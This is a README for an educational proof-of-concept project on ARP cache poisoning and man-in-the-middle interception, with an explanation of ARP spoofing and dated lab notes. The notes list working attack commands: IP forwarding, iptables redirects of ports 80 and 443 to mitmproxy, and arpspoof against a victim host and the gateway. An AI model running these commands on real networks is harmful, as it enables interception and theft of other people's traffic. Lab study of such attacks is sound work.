# ARPCachePoisoningPOC

## Content
- Before start
- How to use

### Before start
- This project is just a POC for ARP Cache Poisoning attack and man-in-the-middle attack. For educational purposes only.
- It might not work correctly if your network envirement has any defense mechanical.
- Thanks for Gemini and Cursor. They have created such a wonderful web page.

### How to use
- 

## Aggressive behavior and knowledge description

- What is ARP Cache Poisoning
ARP Cache Poisoning aka ARP Spoofing. This tnechnical is that an adversary is trying to replace the router's mac address in victim's routing table.
If the adversary did it, the traffic which sent by victim will throught into  adversary's machine, then adversary can look all traffic from victim if there wasn't encrypted.

  - ARP(Address Resolution Protocol) in shortly:
    When a new computer join a LAN it want to send a message to other device, In addition to the IP address, the physical address, also known as the MAC Address, is also required.
    ARP handles this requirement. If there a computer(192.168.5.22) want to send a request to other computer(192.168.5.24). .22 device will make a broadcast request to all computer "What's the mac address of 192.168.5.24."
    When .24 receive this request will send its mac address for response.

    Howerver ARP is stateless protocol, so it is impossible to distinguish the response is correct or not. It cause the adversary has a chance to attack.
    The adversary can broadcast its personal mac address as the gateway, since all requests need to pass the gateway to WAN. Therefore if your router mac address be replaced to .24,
    all your requests will pass through .24 -> gateway -> WAN. If these requests are not encrypted, it gives adversary a opportunity to steal the data from your traffic.
    
     

- Against ARP Cache Poisoning

## Reference
1. https://www.fortinet.com/tw/resources/cyberglossary/what-is-arp
2. https://datatracker.ietf.org/doc/html/rfc826
3. https://ithelp.ithome.com.tw/m/articles/10363424

## Install requirements
`pip install -r requirements.txt`

### Venv(Options)
If your want to protect your computer envirement, using venv.
`python -m venv venv`
`./venv/Scripts/activate`
or
`source ./venv/Scripts/activate`
then
`pip install -r requirements.txt`

## Put mitm cert into your system
`mitmdump -s ./proxy/proxy.py`
After allowing traffic to pass through the proxy, connect to http://mitm.it. You can download a cert for your system.

## Run Web app

`python ./app/app.py`

## 0829

- Kali
  - sudo sysctl -w net.ipv4.ip_forward=1
  - sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
  - sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
  - mitmproxy -s ./proxy/proxy.py
  - python3 ./app/app.py
host: .60
iphone: .101
mitmproxy: .62
: 因為是透過 websocket 拿 mitmproxy 的東西然後放到前端，如果在 .62 以外的地方打開網頁會看不到 proxy 的流量，所以這邊可能要修改。
: 因為 https 沒有憑證不能解密，所以 mitmproxy 收到 https 時不能用，但是現在 proxy 因為通通攔截下來，所以受害者流量通過 https 時會直接攔截不到，導致網頁直接連不上，看看能不能改成只攔截 http。

## 0830
- sudo iptables -t nat -F
- sudo iptables -t nat -L -v -n
- sudo sysctl -w net.ipv4.ip_forward=1
- sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
- sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 8080
- sudo arpspoof -i eth0 -t 192.168.1.60 192.168.1.1
- sudo arpspoof -i eth0 -t 192.168.1.1 192.168.1.60
- ./venv/bin/mitmdump -v -s ./proxy/proxy.py
- python ./app/app.py

- HTTPS 實際環境上應該抓不到，看看 Web 那端要不要改掉，然後可以用 Bettercap 對多個設備進行 arp spoofing

## 0902
- 已經大致把想做的功能做完，

## TODO
- Project 還需要把 README 調整好，然後嘗試使用 Bettercap 對網內的 IP 進行攻擊
- 可以嘗試看看有沒有機會做"防禦"相關內容 ?
- 弄成 Docker ?
- 攔截除了 HTTP 以外的流量

## MITMPROXY
- HTTPS 那邊


